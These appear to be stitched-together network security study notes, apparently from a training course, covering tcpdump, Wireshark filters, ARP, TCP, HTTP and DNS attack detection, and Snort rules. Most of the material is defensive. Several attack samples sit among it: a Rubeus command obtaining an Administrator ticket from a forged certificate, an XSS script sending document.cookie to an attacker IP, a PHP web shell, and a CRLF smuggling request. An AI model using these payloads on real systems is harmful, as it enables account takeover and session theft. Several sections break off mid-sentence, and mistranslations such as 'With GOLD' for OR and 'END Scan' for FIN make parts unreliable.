openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Use Rubeus to obtain a TGT as Administrator:

.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
Once the TGT is loaded, you can for example access \\dc1\c$ as Administrator.

Prevention

To protect against exploitation of the ESC1 model:
Disable the CTFLAGENROLLEESUPPLIESSUBJECT flag on certificate templates.
Enable manual approval (by a Certificate Manager) for any certificate request.

It is recommended to regularly scan the PKI environment with Certify or a similar tool to spot misconfigurations.

Detection
Windows Events:
ID 4886: Certificate request saved.
ID 4887: Certificate issued.
ID 4768: TGT issued following authentication with a certificate.

certutil -view

If GUI access to the PKI server is unavailable, use a remote PowerShell session:

Tcpdump Fundamentals 
Introduction to Tcpdump

Tcpdump is a command-line packet sniffer used to capture and interpret network frames from network interfaces. Mainly available on Unix/Linux systems, Tcpdump allows you to observe network traffic "live", making it an indispensable tool for network analysis, troubleshooting and investigation.
Tcpdump requires root rights to access network hardware interfaces. On Linux systems, it is usually run via sudo.
On Windows, you can use WinDump or launch Tcpdump via WSL (Windows Subsystem for Linux).

Basic options for capturing

Tcpdump offers many switches to customize captures:

| Options | Description |
| ------------------- | ---------------------------------------------------------------- |
| -D | Shows available network interfaces.                      |
| -i | Specifies an interface to use (eg: -i eth0).             |
| -n | Disables hostname resolution.                       |
| -nn | Disables hostname and port resolution.      |
| -e | Shows the Ethernet header in the results.                  |
| -X | Displays packet contents in hexadecimal and ASCII. |
| -v, -vv, -vvv | Increases the verbosity level.                                |
| -c | Captures a set number of packets, then exits.               |
| -s | Sets the maximum length of captured packets.              |
| -S | Shows absolute TCP sequence numbers.                    |
| -q | Shows a minimal summary of the protocol.                         |
| -r | Reads packets from a file.                              |
| -w | Writes packets to a file for later analysis.  |

Examples of use
Show available interfaces

sudo tcpdump -D
Capture traffic from a specific interface

sudo tcpdump -i eth0
Disable DNS and port resolution

sudo tcpdump -i eth0 -nn
Include Ethernet header

sudo tcpdump -i eth0 -e
Show packets in HEX/ASCII

sudo tcpdump -i eth0 -X
Combine multiple options

sudo tcpdump -i eth0 -nnvXX
Interpreting Tcpdump output

The output can include several fields:

| Field | Description |
| --------------------------- | -------------------------------------------------------------- |
| Timestamp | Packet capture time.                          |
| Protocol | Upper layer protocol (IP, TCP, UDP, etc.). |
| Source/Destination | Origin and destination IP and ports.             |
| TCP Flags | Indicators SYN, ACK, RST, etc.                      |
| Sequence and ACK number | Tracking TCP segments.                              |
| Protocol Options | TCP window, SACK, etc.                              |

Reading & Writing files
Save a capture in a .pcap file:

sudo tcpdump -i eth0 -w ~/capture.pcap
Read an existing capture:

sudo tcpdump -r ~/capture.pcap
Tip: Add options like -X or -vvv for more detailed reading.

Tcpdump can be integrated into simple intrusion detection scripts, for example:

Tcpdump Packet Filtering 
Advanced Filters with Tcpdump

Using advanced filters in Tcpdump helps reduce the amount of traffic displayed or recorded, which improves performance and saves disk space. These filters can be combined with the classic Tcpdump syntax to perform targeted captures: from a simple host to very specific flows via ports or TCP indicators.

Useful Tcpdump Filters

| Filter | Effect |
| -------------------- | ------------------------------------------------------------------ |
| host | Shows traffic involving a given host (bidirectional traffic). |
| src/dst | Filter according to the source or destination address.                       |
| net | Filters network traffic (CIDR notation, e.g. /24).           |
| proto | Filter by protocol (e.g. tcp, udp, icmp, ether).          |
| port | Filters traffic with a specific source or destination port.     |
| portrange | Filters a range of ports (eg: 0-1024).                      |
| less / greater | Filter based on packet size.                                 |
| and / or / not | Combines, adds, or excludes conditions.                           |

Examples of Practical Filters
Filtering by Host

sudo tcpdump -i eth0 host 172.16.146.2
Filtering by Source

sudo tcpdump -i eth0 src host 172.16.146.2
Filtering by Source Port

sudo tcpdump -i eth0 tcp src port 80
Filtering by Destination Network

sudo tcpdump -i eth0 dst net 172.16.146.0/24
Filtering by Protocol

sudo tcpdump -i eth0 udp
sudo tcpdump -i eth0 proto 17 # UDP (protocol 17)
Filtering by Port / Port Range

sudo tcpdump -i eth0 tcp port 443
sudo tcpdump -i eth0 portrange 0-1024
Filtering by Packet Size

sudo tcpdump -i eth0 less 64
sudo tcpdump -i eth0 greater 500
Filter Combinations
With AND

sudo tcpdump -i eth0 host 192.168.0.1 and port 23
With GOLD

sudo tcpdump -r sus.pcap icmp or host 172.16.146.1
With NOT

sudo tcpdump -r sus.pcap not icmp
Capturing vs. Post Analysis
Pre-capture filtering: non-matching packets are not recorded → space saving but possible loss of information.
Post-capture filtering: Packets are filtered when reading a .pcap file, without affecting the original data.

Intermediate Network Traffic Analysis Overview

ARP Spoofing & Abnormality Detection 
Overview
The Address Resolution Protocol (ARP) is often the target of attacks such as:
Man-in-the-Middle (MITM)
Denial of Service (DoS)
These attacks are detectable because they rely on network broadcasts, which can be captured via a packet sniffer.

How ARP works
Hosts use ARP to find out the MAC address associated with an IP on the local network.

ARP process steps:
Host A checks its ARP cache.
If the IP is not found, it broadcasts an ARP Request.
Host B responds with an ARP Reply containing its IP and MAC address.
A's ARP cache is updated with the new IP-MAC match.

ARP Poisoning & Spoofing
ARP Cache Poisoning: The attacker sends false ARP frames to deceive ARP caches.
Attack steps:
The attacker sends falsified ARP Replies to the victim and the router.
Both update their cache with the attacker's fake MAC address.
The attacker becomes a relay, intercepts the traffic and can modify it (MITM attack).

Detection & Prevention
Detection:
Monitor unusual ARP traffic patterns (e.g. repeated requests).
Spot IP-MAC inconsistencies in ARP responses.
Prevention:
Static ARP entries: prevent automatic updating (but difficult to manage).
Port security on switches: limits the MACs allowed on a network port.

Practical detection with tcpdump and Wireshark
Installing tcpdump:

sudo apt install tcpdump -y
Capturing ARP traffic:

sudo tcpdump -i eth0 -w capturearp.pcapng
Analysis in Wireshark:

wireshark capturearp.pcapng
Useful Wireshark filters:

| Purpose | Filter |
| ---------------------- | --------------------------------------------------- |
| ARP Requests | arp.opcode == 1 |
| ARP Responses | arp.opcode == 2 |
| Address duplications | arp.duplicate-address-detected && arp.opcode == 2 |

Examine IP/MAC anomalies

Use arp -a on Linux to inspect the ARP table:

arp -a | grep 50:eb:f6:ec:0e:7f
arp -a | grep 08:00:27:53:0c:ba
In Wireshark, filter suspicious MAC addresses:

eth.addr == 50:eb:f6:ec:0e:7f or eth.addr == 08:00:27:53:0c:ba
ARP Scanning & Denial-of-Service 
Signs of abnormal activity in ARP traffic

In addition to poisoning and spoofing attacks, malicious actors can also exploit ARP to perform network intelligence.
Indicators of an ARP scan:
Broadcast ARP requests sent to sequential IP addresses (e.g.: .1, .2, .3, …).
ARP requests sent to non-existent hosts.
Abnormal volume of ARP traffic originating from a single host (potentially compromised or malicious).

Detecting an ARP scan

By opening the ARP_Scan.pcapng file in Wireshark and applying the following filter:

arp.opcode
We can observe:
A host sending ARP requests to all IPs in a subnet, suggesting an active ARP scan (often initiated by tools like Nmap).
ARP responses from active hosts allow the attacker to map online devices.

Identifying a Denial of Service (DoS) via ARP
Steps of an ARP DoS attack:
The attacker scans active hosts.
It attempts to corrupt network ARP caches:
By assigning new MAC addresses to each legitimate IP.
By assigning the same IP (e.g.: 192.168.10.1) to several machines (IP conflicts), disrupting communication.
Objective:

Plunging the subnet into ARP chaos, resulting in:
Disruption of connections.
Possibility of interception (MITM).
Saturation of the ARP cache of devices (DoS).

Reaction to ARP attacks
Tracing and identification:
Trace back to the physical machine that is sending the suspicious ARP packets.
It is possible that she herself is infected or used as a relay.
Containment:
Disconnect or isolate the affected network segment via the switch or router.
This makes it possible to stop the propagation, block the data leak or end the DoS/MITM attack.

Network Traffic Analysis at the IP Layer and Fragmentation Abuse

When analyzing network traffic, the IP layer is crucial for understanding packet transfer between hosts. However, this layer does not have mechanisms to detect lost or corrupted packets, these problems being handled by the transport and application layers. Here are the key fields in the IP header:

Abuse of Fragmentation Fields

Attackers can manipulate these fields to bypass network controls. Understanding the abuse of these fields can improve detection when analyzing traffic.
Fragmentation Abuse Techniques

Legitimate hosts fragment packets to transfer large sets of data, following the Maximum Transmission Unit (MTU) standard. Attackers exploit fragmentation to:
Evasion of Intrusion Detection Systems (IDS) / Intrusion Prevention Systems (IPS): If the IDS does not reassemble the fragments, attackers can use fragmented scans (e.g., with nmap) to bypass detection.
Firewall Evasion: Fragmented packets can bypass firewall controls if they are not reassembled before delivery.
Firewall/IPS/IDS resource exhaustion: Small MTU sizes (e.g., 10, 15 bytes) are resource intensive and may bypass reassembly due to resource limits.
Denial of Service (DoS): Old hosts can be overwhelmed by large fragmented packets, causing a denial of service attack.

A properly configured network mechanism should use deferred reassembly, that is, wait for all fragments before performing packet inspection.

TCP Handshake Abnormalities 
Probing TCP Services: Understanding Anomalous Behavior

When attackers probe TCP services, they often exploit various scanning techniques that deviate from standard traffic patterns. These behaviors can reveal malicious intent and indicate attempts to identify vulnerable services. To understand these anomalies, we first need to review how a standard TCP 3-way handshake works.

TCP Handshake Overview
SYN Request: The client sends a SYN packet to initiate the connection to the target port.
SYN-ACK Response: If the target port is open, the server responds with a SYN-ACK, acknowledging the request and indicating that the port is open.
ACK Completion: The client responds with an ACK to complete the handshake and establish the connection.
Common TCP Flags and Their Functions
URG (Urgent): Indicates that the data should be processed immediately.
ACK (Acknowledgment): Acknowledgements that data has been received.
PSH (Push): Pushes data to the application layer immediately.
RST (Reset): Terminates the connection, often used in attack scenarios.
SYN (Synchronize): Initiates the connection during the handshake.
FINISH: Ends the connection.
ECN (Explicit Congestion Notification): Notifies the sender of network congestion.

These flags are essential in tracking the state of TCP connections and can help identify unusual or malicious activity.

Indicators of Abnormal TCP Handshake Patterns

When attackers probe services, certain abnormal behaviors can be observed during the TCP handshake or communication. These anomalies often serve as indicators of malicious activity:
Excessive Flags: If multiple flags are used in one packet, or if the same flag appears repeatedly, this may indicate a scanning attempt.
Unusual Flag Combinations: Combinations of flags that are not typically used together can suggest attempts to exploit vulnerabilities (e.g., RST flag usage in attempts to terminate or hijack connections).
Single Host Targeting Multiple Ports or Hosts: Scans from a single host that target multiple ports or hosts are common in network recognition. These could be decoy scans, or the attacker could be trying random source IPs to evade detection.

Types of TCP Scans
SYN Scan (Half-Open Scan)
Technique: The attacker sends a SYN packet to a target port. If the port is open, the server responds with a SYN-ACK. The attacker then sends an RST to close the connection without completing the handshake.
Response:
Open Port: SYN-ACK response from the server.
Closed Port: RST response from the server.
Detection: This scan technique is stealthy because the attacker does not complete the handshake, leaving less trace in the target system's logs.
SYN Stealth Scan
Technique: Similar to SYN Scan, but the attacker only partially completes the handshake (e.g., only sends a SYN and never sends an ACK). This helps avoid detection by intrusion detection systems (IDS) and firewalls.
Response:
Open Port: SYN-ACK response.
Closed Port: No response or an RST.
Detection: This scan is particularly difficult to detect because it never fully establishes a connection.
NULL Scan
Technique: The attacker sends TCP packets with no flags set, which can confuse the target system.
Response:
Open Port: No response from the system.
Closed Port: The system replies with an RST packet.
Detection: NULL scans exploit the fact that some systems do not respond to packets with no flags set, while others will send an RST for closed ports.
ACK Scan
Technique: In an ACK scan, the attacker sends packets with the ACK flag set. This can be used to map out firewalls or filtering devices by determining whether the port is open or closed.
Response:
Open Port: No response or an RST packet (depending on firewall configuration).
Closed Port: An RST packet response.
Detection: The ACK scan can help the attacker determine which ports are filtered and which are open/closed, providing useful information for further attacks.
END Scan
Technique: All packets are sent with the FIN flag set. This is a highly unusual scanning technique.
Response:
Open Port: No response from the system.
Closed Port: The system replies with an RST packet.
Detection: Like the NULL scan, the FIN scan relates on peculiar behavior from the target system, and is easily detectable if the attacker sends packets with the FIN flag in an unexpected context.
Christmas Tree Scan
Technique: The attacker sends packets with all flags set (SYN, FIN, URG, PSH, RST, and ACK). This scan is designed to confuse the target system or firewall.
Response:
Open Port: No response or an RST packet (depending on firewall or system configuration).
Closed Port: An RST response.
Detection: Xmas tree scans are easily identifiable because all the flags are set, which is highly unusual for normal network traffic.

Summary of TCP Scan Responses

| ScanType | Flags Used | Open Port Response | Closed Port Response |
| -------------------- | -------------- | ---------------------- | ------------------------ |
| SYN Scan | SYN | SYN-ACK | RST |
| SYN Stealth Scan | SYN | SYN-ACK | No Response / RST |
| NULL Scan | No Flags | No Response | RST |
| ACK Scan | ACK | No Response / RST | RST |
| END Scan | END | No Response | RST |
| Christmas Tree Scan | All Flags | No Response / RST | RST |

Conclusion

TCP scanning techniques, such as SYN, FIN, NULL, and Xmas Tree scans, all rely on manipulating specific flags to achieve recognition while evading detection. By analyzing these abnormal TCP patterns—whether excessive flag use, unusual flag combinations, or multiple host and port targeting—security professionals can detect early signs of malicious scanning or probing. Identifying these patterns through tools like Wireshark is critical for preventing potential attacks that may follow.
TCP Connection Resets & Hijacking 
Attacks on TCP Connections: Connection Termination and Hijacking

TCP connections, while robust in many contexts, have vulnerabilities, particularly in protecting against termination or hijacking of connections. These vulnerabilities can manifest themselves as connection termination attacks via RST packets or more advanced connection hijacking techniques.
TCP Connection Termination via RST Packets

An RST (or TCP connection termination) packet injection attack aims to disrupt a network service. This attack takes place according to the following steps:
Source Spoofing: The attacker spoofs the source address to match that of the target machine.
RST Packet Injection: The attacker creates a TCP packet with the RST flag to force the termination of the active connection.
Targeted Destination Port: The attacker specifies a destination port currently used by the target machine.
TCP RST Attack Detection

To detect an RST attack, you can look for several indicators in Wireshark or other packet capture tools:
Abnormal Packet Volume: An abnormal amount of packets sent to a single port can be a sign of an RST attack. This usually manifests itself as repetitive packets with the RST flag enabled.
MAC Address Misrepresentation: If packets with a spoofed IP (e.g., 192.168.10.4) are observed with an unexpected MAC address, this may indicate malicious activity. Indeed, a spoofed packet must match the MAC address of the target machine, but an inconsistency suggests an attacker attempting to disrupt the connection.

Note that MAC address spoofing is possible, but it can lead to inconsistencies, especially in the case of ARP poisoning.

TCP Connection Hijacking

More sophisticated attacks include TCP connection hijacking, where the attacker takes control of an active TCP session. This attack involves several complex techniques:
Sequence Number Prediction: The attacker predicts sequence numbers to inject packets at the correct location in the target connection, thereby imitating the legitimate flow of data.
Source Spoofing: As with RST attacks, the attacker spoofs the source IP address to imitate the target machine.
Blocking ACKs: To maintain the hijacked connection, the attacker blocks or delays the ACK (Acknowledgment of Receipt) packets sent by the target machine. This allows a continuous flow of data to be maintained without the target machine being able to reestablish control.
TCP Connection Hijack Indicators

Several anomalies can indicate an attempt to hijack a TCP connection:
Anomalies in Sequence Numbers: Inconsistent or unusual sequence numbers may suggest attempts at sequence prediction, which is typical of connection hijacking attacks.
Blocked or Delayed ACKs: If ACK packets are delayed or missing, this may indicate that the attacker is trying to take control of the session by blocking confirmation of sent packets.

TCP connection hijacking is often coupled with techniques like ARP poisoning, which allows the attacker to manipulate MAC addresses in the network, making traffic more difficult to trace.

Conclusion

Attacks on TCP connections, such as RST packet injection and connection hijacking, exploit flaws inherent in the TCP protocol. Detection of these attacks relies on observing anomalies in sequence numbers, repetitive RST packets, as well as inconsistencies in MAC addresses and ACK packets. To defend against these attacks, it is essential to:
Carefully analyze TCP flows to spot anomalies in traffic.
Check firewall and network configuration to detect and block suspicious activity.
Use secure protocols like SSH instead of Telnet to limit the risk of connection interception.

By actively monitoring these indicators and implementing appropriate security controls, it is possible to detect and mitigate TCP-based attacks before they cause significant damage.

Manipulated or unexpected Host headers are often a sign of an attack. For example, an attacker could attempt to force a server to execute a request to an unauthorized address or subdomain, or to bypass domain restrictions.
HTTP Traffic Filtering

Start by limiting traffic in Wireshark to only observe HTTP requests and responses:

http

Specify the legitimate server IP address to exclude normal traffic. For an external server, replace with the domain name:

http.request and (!(http.host == "192.168.10.7"))

Examine the results for suspicious Host headers such as 127.0.0.1 or unusual host names like admin. Attackers often manipulate these headers to escalate privileges using proxy tools like Burp Suite.
Preventive Measures:
Check virtualhost and access configurations to prevent unauthorized access.
Keep your web server updated.

400 Error Analysis and Query Smuggling Detection

Error code 400 (Bad Request) can indicate suspicious activity and is useful for identifying malicious HTTP actions, including request smuggling (CRLF injection) attacks.
Filtering Code 400 Responses

To detect request smuggling attempts, filter responses with code 400 in Wireshark:

http.response.code == 400
Follow these HTTP feeds to discover attempts at CRLF Injection, a form of smuggling where an attacker attempts to bypass security controls via malformed HTTP headers.
Example of CRLF Attempt

An attacker could construct a query as follows:

GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5
\r\n
GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080
\r\n
HTTP/1.1
Host: 192.168.10.5
Decoded by the server, this gives two distinct requests:

GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5

GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080

HTTP/1.1
Host: 192.168.10.5
If the server is vulnerable, both requests may succeed, allowing unauthorized access.

Some poorly secured Apache configurations can leave the server vulnerable to this type of attack:

<VirtualHost:80>
    RewriteEngine on
    RewriteRule "^/categories/(.)" "http://192.168.10.100:8080/categories.php?id=$1" [P]
    ProxyPassReverse "/categories/" "http://192.168.10.100:8080/"
</VirtualHost>
This misconfiguration allows the attacker to redirect requests to another server without restrictions, facilitating the request smuggling attack.

Monitoring Successful Exploits

To detect a successful exploit, watch for a 200 (Success) code in response to a suspicious request. Regular analysis of responses with 400 and 200 codes is essential to identify and mitigate adversarial actions in HTTP traffic.

In summary, detecting Host header manipulation and request smuggling attacks relies on constant vigilance for HTTP errors, header anomalies, and tracking HTTP status codes in traffic.
Cross-Site Scripting (XSS) & Code Injection Detection 
Detecting abnormal behavior in HTTP traffic

An unusual volume of HTTP requests to an unknown internal "server" may signal suspicious activity, including a Cross-Site Scripting (XSS) attack. These requests can be used to exfiltrate cookies or session tokens, although the values ​​are often encoded or encrypted in transit.

Cross-Site Scripting (XSS)

XSS occurs when an attacker injects malicious JavaScript code into a web page via user input fields. This code is then executed in other users' browsers, allowing the attacker to steal sensitive data such as cookies or session tokens.
Example of XSS payload:

<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>
What this script does: It captures the user's cookies and silently sends them to an internal IP controlled by the attacker.
If this type of code is detected:
Immediately delete the injected script.
Consider temporarily taking the affected server offline to apply security patches.

Code injection (PHP, etc.)

Attackers can also exploit input fields to insert executable code (such as PHP), in order to gain remote access or take control of the server.
Typical examples of malicious PHP code:

<?php system($_GET['cmd']); ?>
Allows the attacker to execute system commands remotely via the URL.

<?php echo whoami; ?>
Shows the current user running the web server.
If this code is discovered:
Delete it immediately.
Identify the origin of the injection and secure the vulnerability used.

Prevention measures against XSS attacks and code injections
Sanitize user inputs:
Avoid any unfiltered HTML/JS content.
Use functions like htmlspecialchars() (PHP), DOMPurify (JS), or secure server-side ORMs.
Never execute user input as code:
No data sent by the user should be dynamically evaluated (eval(), system(), etc.).
Prefer parameterized calls and secure APIs.
SSL Renegotiation Attacks 
HTTPS Traffic Analysis and SSL/TLS-Based Attack Detection

When analyzing HTTPS traffic, it is essential to understand HTTPS protocol indicators that can reveal SSL/TLS-based attacks. HTTPS relies on encryption protocols, specifically:
Transport Layer Security (TLS)
Secure Sockets Layer (SSL)
HTTPS Connection Process
Handshake: The server and client establish a connection, agree on encryption algorithms, and exchange certificates.
Encryption: After the handshake, the connection is encrypted with the selected algorithm.
Data Exchange: Encrypted data (web pages, images, etc.) are exchanged between the client and the server.
Decryption: Both sides decrypt the data using their private and public keys.
SSL Renegotiation Attack

SSL renegotiation attacks attempt to negotiate weaker encryption standards or exploit server resources, leading to potential vulnerabilities. Another example of an attack related to HTTPS encryption is the Heartbleed vulnerability (CVE-2014-0160).
TLS and SSL Handshake Process

To secure a connection, a TLS or SSL handshake is necessary, involving:
Client Hello: The client sends supported TLS/SSL versions, cipher suites, and random data.
Server Hello: The server responds with the chosen version, cipher suite, and a nonce.
Certificate Exchange: The server sends its certificate containing the public key.
Key Exchange: The client generates a premaster secret, encrypts it with the server's public key, and sends it to the server.
Session Key Derivation: Both parties derive session keys using the exchanged nonces and the premaster secret.
End Messages: Both parties exchange end messages, confirming the success of the handshake.
Secure Data Exchange: Encrypted communication begins.
Algorithmic Detail of the TLS Handshake

| Handshake Stage | Relevant calculations |
| ----------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| Customer Hello | ClientHello = { ClientVersion, ClientRandom, Ciphersuites, CompressionMethods } |
| ServerHello | ServerHello = { ServerVersion, ServerRandom, Ciphersuite, CompressionMethod } |
| Certificate Exchange | ServerCertificate = { ServerPublicCertificate } |
| Key Exchange | ClientDHPublicKey = DH\KeyGeneration(ClientDHPrivateKey) <br> ServerDHPublicKey = DH\KeyGeneration(ServerDHPrivateKey) |
| Premaster Secret | PremasterSecret = DH\KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey) |
| Session Key Derivation | MasterSecret = PRF(PremasterSecret, "master secret", ClientNonce + ServerNonce) |
| Extraction of Session Keys | ClientWriteMACKey, ServerWriteMACKey, ClientWriteKey, ServerWriteKey, ClientWriteIV, ServerWriteIV |
| Ending Messages | FinishedMessage = PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello)) |
Detecting SSL Renegotiation Attacks
Filter Handshake Messages: In Wireshark, use the following filter to see only handshake messages:

ssl.record.contenttype == 22
SSL Renegotiation Attack Indicators:
Multiple Client Hellos: Repeated Client Hello messages from the same client within a short period of time signal an attack, because the attacker repeatedly triggers the renegotiation to lower the cipher suite.
Disorderly Handshake Messages: Observing Client Hello messages after the handshake has completed may indicate tampering or an attack.
Reasons for SSL Renegotiation Attacks
Denial of Service: Excessive renegotiation consumes server resources, making the server unresponsive.
Cipher Suite Exploitation: Attackers can attempt renegotiation to exploit weak encryption configurations.
Cryptanalysis: Renegotiation can facilitate cryptanalysis by helping attackers analyze SSL/TLS patterns, which could expose vulnerabilities.
Peculiar DNS Traffic 
DNS Traffic Analysis

Analyzing DNS traffic can be complex due to its high volume, but identifying anomalies is essential to detecting malicious activity. Here's an overview of how DNS queries work and how to detect suspicious activity.
DNS queries

DNS queries allow clients to resolve domain names to IP addresses and vice versa.
DNS Forward Queries

In a forward lookup, the client resolves a domain name to an IP address, following these steps:
Request Initiation: The client queries a domain, for example academy.hackthebox.com.
Local Cache Check: Checks the local DNS cache; if not resolved, continue.
Recursive Query: Sends the query to the configured DNS server.
Root Servers: If necessary, the DNS resolver queries the root servers.
TLD Servers: The root server directs to TLD servers (e.g. .com).
Authoritative Servers: The TLD server points to the authoritative server of the domain.
Authoritative Domain Servers: The resolver obtains the IP address.
Answer: The IP address is returned to the client.
DNS Reverse Queries

Reverse lookups are used to find a domain name from an IP address:
Request Initiation: The client sends a reverse DNS request with the IP address.
Reverse Lookup Zones: The DNS resolver checks if it is authorized.
Query for PTR: The resolver searches for a PTR record.
Answer: The FQDN (Fully Qualified Domain Name) is returned if a matching PTR is found.
DNS Record Types

| Record Type | Description |
| --------------------- | -------------------------------------------------------------- |
| A | Associates a domain name with an IPv4 address |
| AAAA | Associates a domain name with an IPv6 address |
| CNAME | Create an alias for a domain |
| MX | Specifies the mail server for the domain |
| NS | Domain Authoritative Name Servers |
| PTR | Used for reverse lookups (IP -> Domain) |
| TXT | Specifies text associated with the domain |
| SOA | Administrative information on the area |
Detecting DNS Enumeration Attempts

A high volume of DNS queries from a single host may indicate DNS enumeration. To detect this, you can filter DNS traffic in Wireshark using the following filter:

dns
If queries include ANY, this may indicate a DNS enumeration, or even a subdomain enumeration.
DNS Tunneling Detection

DNS tunneling can involve a significant number of TXT records from a single host. Attackers can exfiltrate data by appending it to the TXT field of DNS queries.
DNS Tunneling Indicators

Examine DNS traffic for unusual or unexpected data in the TXT field. Data can be encoded or encrypted, often in base64:
Example of base64 encoded data:

echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d
Multiple Encoding Management

Some attackers can encode data multiple times or encrypt it, making it more difficult to detect:

echo 'encoded_string' | base64 -d | base64 -d | base64 -d
Reasons for DNS Tunneling
Data Exfiltration: Used to stealthily export data from a network.
Command and Control: Allows compromised systems to communicate with attacker-controlled servers, often used in botnets.
Firewall Bypass: DNS tunnels can bypass firewalls or proxies focusing on HTTP/HTTPS protocols.
Domain Generation Algorithms (DGA): Advanced malware uses domain generation algorithms (DGA) to generate dynamic domain names, making detection more difficult.
IPFS and DNS Tunneling

Advanced threat actors can use IPFS (Interplanetary File System) to store and retrieve malicious files. This makes DNS/HTTP traffic to URIs like these particularly significant:

IPFS operates in a decentralized manner, which makes it difficult to detect. Regular monitoring of DNS and HTTP/HTTPS traffic is essential to mitigate these attacks.
Strange Telnet & UDP Connections 
Analysis of Telnet and UDP Traffic: Detection of Suspicious Activities

When analyzing network traffic, it is essential to pay attention to Telnet traffic and UDP traffic, which can sometimes reveal suspicious or anomalous activity that might otherwise go unnoticed.
Telnet

The Telnet protocol, although obsolete due to its security concerns, is still used in some legacy systems (for example, older Windows NT systems). Even though Telnet is largely being replaced by SSH for secure remote communication, it can still be useful to monitor Telnet traffic to detect possible suspicious or abusive connections.
Detection of Traditional Telnet Traffic on Port 23

Port 23 is the default port for Telnet. When observing traffic on this port in Wireshark, pay close attention to the communications for any signs of abuse. Although Telnet is an unencrypted and easy-to-inspect protocol, attackers can sometimes encrypt or obfuscate data in Telnet traffic. It is therefore necessary to be vigilant and carefully inspect data flows.
Unrecognized Telnet Traffic on Non-Standard Ports

Telnet can operate on any port, and attackers can move Telnet communications to non-standard ports to hide their malicious activities. For example, communications on port 9999 may indicate an attempt at concealment. In this case, it is advisable to follow the TCP stream in Wireshark to examine further.
Telnet traffic over IPv6

If Telnet traffic over IPv6 is detected in an IPv4-configured network, this could indicate unauthorized access. To specifically filter Telnet over IPv6 traffic in Wireshark, use the following filter:

((ipv6.srchost == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dsthost == fe80::c9c8:ed3:1b10:f10b)) and telnet
This filter helps you isolate Telnet traffic to specific IPv6 addresses for further inspection.

UDP Communications Monitoring

UDP traffic is often used by attackers to bypass TCP-based monitoring, due to the connectionless nature and fast transmission of UDP. This feature can be advantageous for stealth data exfiltration.
TCP vs. UDP

Unlike TCP, which requires a handshake process (SYN, SYN/ACK, ACK) before data transmission, UDP is a connectionless protocol, which allows faster communication, but reduces the reliability and traceability of connections.
Common Uses of UDP

When investigating UDP traffic, it is important to consider the following legitimate use cases:
Real-time applications: Applications such as streaming video, online gaming, and voice over IP use UDP for faster connections.
DNS (Domain Name System): DNS queries and responses are primarily UDP-based.
DHCP (Dynamic Host Configuration Protocol): UDP is used to assign IP addresses and configure networks.
SNMP (Simple Network Management Protocol): UDP is used for network monitoring and management.
TFTP (Trivial File Transfer Protocol): TFTP, a protocol for simple file transfers, also uses UDP, especially in older systems.
Anomalies in UDP Traffic

For unusual UDP traffic, follow the flow in Wireshark to inspect its contents and verify its legitimacy. Any unexpected or inconsistent communication could indicate malicious activity, such as data exfiltration or amplification attacks.

Summary
Telnet: Although increasingly obsolete, Telnet traffic over non-standard ports or over IPv6 should be closely monitored, especially if it originates from suspicious sources or destinations. Detecting Telnet on unexpected ports, such as port 9999, may indicate an attempt to obfuscate malicious activity.
UDP: UDP traffic, due to its connectionless nature, can be used for stealth data exfiltration or attack purposes. Monitor carefully for unusual UDP flows, especially for services like DNS, DHCP, and SNMP that often use this protocol.

By being vigilant and properly filtering flows, you can effectively detect anomalies and reduce the risks associated with these types of traffic.

Suricata rules are used to monitor network traffic for specific patterns or indicators, often indicative of malicious behavior. These rules can provide crucial information about network activity, aid in threat detection, and contribute to proactive network security strategies.
Anatomy of a Suricata ruler

Here is an example of a basic Suricata rule:

Header (action protocol from\ip port -> to\ip port):
Action: Tells Suricata what to do when the rule matches:
alert: Generates an alert.

Snort Fundamentals 
Snort: General Presentation

Snort is an open-source tool that acts as an intrusion detection system (IDS) and intrusion prevention system (IPS). It can also be used as a packet analyzer or traffic sniffer.
Snort inspects all network traffic and can record all activity, providing complete visibility at the application layer. Its behavior is directed by specific rules that define what it should monitor or identify.

Snort Modes of Operation
IDS/IPS in inline mode: Actively blocks traffic when operating as IPS.
Passive IDS: Observes and logs traffic without interrupting it.
Network-based IDS: Monitors network traffic from multiple hosts.
Host-based IDS: Rarely used with Snort (specialized tools are more suitable).

DAQ (Data Acquisition) modules

DAQ modules allow Snort to interact with network data sources.
Passive mode: Observes traffic without blocking it.
Inline mode: Can block traffic according to defined rules (e.g.: use of the -Q option with the afpacket DAQ module).

Packet sniffing: Decrypts network traffic and forwards packets to preprocessors.
Preprocessors: Analyze packet types and their behavior. Configured in the snort.lua file, they detect, for example, HTTP traffic or scans.
Detection engine: Compares packets to Snort rules.
Logging and alerts: Packets matching rules are logged, often in syslog or databases, using output plugins defined in snort.lua.

snort.lua: Main file, containing network variables, decoders, detection engine, and outputs.

Snort Rule Development 
Snort Rules: Malicious Activity Detection

A Snort rule is a powerful tool for identifying and reporting potential malicious activity in network traffic. Although Snort rules resemble Suricata rules with a structure consisting of a rule header and options, the Snort documentation offers detailed guidance for creating effective rules.

Here are example rules for detecting specific malware. You can use these rules over SSH on the target system to reproduce and understand the commands.

Example 1: Ursnif detection (inefficiently)

alert tcp any any -> any any (msg:"Possible Ursnif C2 Activity"; flow: established,toserver; content:"/images/", depth 12; content:"2F"; content:"2B"; content:"User-Agent|3a 20|Mozilla/4.0 (compatible|3b| MSIE 8.0|3b| Windows NT"; content:!"Accept"; content:!"Cookie|3a|"; content:!"Referer|3a|"; sid:1000002;
This rule detects Ursnif malware by looking for specific patterns in HTTP traffic:
flow:established,toserver; : corresponds to TCP connections established to the server.
content:"/images/", depth 12; : searches for the string /images/ in the first 12 bytes.
Other content fields match additional patterns, such as "\2F", "\2B" and specific HTTP headers.
! in content:!"Accept"; indicates the absence of certain HTTP headers.

